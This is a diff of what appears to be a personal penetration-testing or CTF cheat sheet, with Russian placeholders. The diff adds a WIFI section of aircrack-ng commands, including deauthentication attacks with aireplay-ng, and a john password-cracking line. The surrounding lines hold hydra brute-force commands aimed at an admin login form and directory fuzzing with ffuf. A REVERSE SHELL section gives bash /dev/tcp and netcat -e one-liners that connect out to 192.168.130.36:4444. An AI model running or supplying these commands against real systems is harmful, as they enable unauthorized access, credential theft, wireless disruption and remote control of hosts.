@@ -1,5 +1,13 @@
+WIFI:
+	--band a
+	sudo airmon-ng check kill
+	sudo airmon-ng start wlan0mon
+	sudo airodump-ng wlan0mon
+	sudo airodump-ng --bssid [MAC] -c wlan0mon
+	sudo aireplay-ng -0 0 -a [MAC_РОУТЕРА] wlan0mon
+	sudo aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30
 TOOLS:
-	nmap -sS -p- --open -n -T4 -vvv <IP-адрес>
+	nmap -sS --open -sV -Pn -T4 -vvv <IP-адрес>
 	ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.180.85/FUZZ -mc all -c -v -fc 404
 	hydra -L userlist -P passlist protocol://address -vvv  
 	hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.132.253 http-form-post '/admin/:user=^USER^&pass=^PASS^:Username or password invalid' -vvv
@@ -10,6 +18,7 @@ TOOLS:
 	stegseek image wordlist
 	zbarimg image.png
 	java -jar /bin/stegsolve.jar
+	john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 REVERSE SHELL:
 	/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.130.36/4444 0>&1"
 	nc 192.168.130.36 4444 -e /bin/bash
